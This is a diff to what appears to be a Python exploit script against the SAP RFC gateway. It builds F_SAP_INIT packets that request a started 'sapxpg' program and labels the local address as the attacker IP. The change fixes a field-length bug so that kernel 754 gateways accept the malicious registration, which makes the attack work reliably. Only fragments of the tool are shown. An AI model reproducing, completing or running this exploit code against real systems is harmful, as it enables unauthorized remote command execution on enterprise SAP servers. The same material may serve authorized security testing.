@@ -260,7 +260,7 @@ def build_saprf_dt_struct(target_ip, long_tp="sapxpg"):
     return d
 
 
-def build_p2(target_ip, dest_name="T_75"):
+def build_p2(target_ip, dest_name="T_75", local_ip=None):
     """Build F_SAP_INIT packet (452 bytes).
 
     info2=0x01 (WITH_LONG_LU_NAME)
@@ -272,7 +272,22 @@ def build_p2(target_ip, dest_name="T_75"):
                   by both kernel 754 and 793.
     info=0x0087 (SYNC_CPIC_FUNCTION + WITH_HOSTADDR + WITH_GW_SAP_PARAMS_HDR
                  + R3_CPIC_LOGIN_WITH_TERM)
+
+    ncpic_lu — must be ≤7 characters so that pad_right_null guarantees a NUL
+               terminator within the 8-byte field.  Kernel 754 uses strlen()
+               on this field; without a NUL within the field the string bleeds
+               into ncpic_tp causing garbage and the registration is silently
+               dropped.  We use the first 7 chars of local_ip (the real TCP
+               source address, e.g. "10.10.1") so the gateway also sees a
+               valid and consistent LU address.
     """
+    # Build ncpic_lu: up to 7 chars of the local (attacker) IP so the 8th
+    # byte is always \x00 (pad_right_null guarantees this when len < 8).
+    if local_ip:
+        lu = local_ip[:7]   # e.g. "10.10.1" from "10.10.1.100"
+    else:
+        lu = "10.10.1"      # safe fallback, always < 8 chars
+
     dt = build_saprf_dt_struct(target_ip)
 
     header = build_saprfc_header_v6(
@@ -289,7 +304,7 @@ def build_p2(target_ip, dest_name="T_75"):
 
     ext = build_saprfcextend(
         dest_name=dest_name,
-        ncpic_lu="172.16.0",
+        ncpic_lu=lu,            # ≤7 chars → always NUL-terminated within the field
         ncpic_tp="sapxpg",
         ctype=0x45,             # STARTED_PRG
         conn_idx=0xFFFF,
@@ -972,6 +987,15 @@ def main():
         print("[-] Connection failed: %s" % e)
         sys.exit(1)
     print("[+] Connected")
+
+    # Rebuild P2 now that we know our local (source) IP.
+    # ncpic_lu must be NUL-terminated within its 8-byte field; we pass the
+    # real local IP so kernel 754 does not silently drop F_SAP_INIT due to a
+    # missing NUL or a mismatched LU address.
+    local_ip = sock.getsockname()[0]
+    p2_data = build_p2(args.host, args.dest, local_ip=local_ip)
+    if args.verbose:
+        print("[*] Local IP: %s  →  ncpic_lu = %r" % (local_ip, local_ip[:7]))
 
     # Step 1: GW_NORMAL_CLIENT
     # Wait up to args.timeout for the first (primary) response frame, then drain
